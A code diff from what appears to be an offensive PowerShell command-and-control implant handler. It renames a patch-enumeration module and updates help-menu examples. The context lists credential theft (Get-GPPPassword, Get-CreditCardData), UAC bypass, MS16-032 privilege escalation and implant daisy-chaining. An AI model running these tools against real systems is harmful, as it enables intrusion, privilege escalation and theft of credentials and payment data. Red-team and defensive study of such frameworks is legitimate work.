@@ -133,14 +133,15 @@ function Implant-Handler
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
-        write-host " Get-MSHotfix|Where-Object {$_.Installedon -gt ((Get-Date).Adddays(-2))}|Select-Object -Property Computername, KBArticle,InstalledOn, HotFixID, InstalledBy|ft -autosize" -ForegroundColor Green 
+        write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Invoke-AllChecks" -ForegroundColor Green
         write-host " Invoke-UACBypass" -ForegroundColor Green
         write-host " Invoke-UACBypassProxy" -ForegroundColor Green
-        write-host ' Get-MSHotfix|Where-Object {$_.HotfixID -match "KB3139914"}' -ForegroundColor Green
+        write-host ' Get-MSHotfixes | Where-Object -Property hotfixid -EQ KB3176936' -ForegroundColor Green
+        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"} - this is specifically for PowerShell 2.0' -ForegroundColor Green
         write-host " Invoke-MS16-032" -ForegroundColor Green 
         write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
         write-host " Get-GPPPassword" -ForegroundColor Green 
@@ -866,9 +867,9 @@ param
             { 
                 CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-mshotfix'))
+            if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
             { 
-                CheckModuleLoaded "Get-MSHotfix.ps1" $psrandomuri
+                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('get-gpppassword'))
             { 
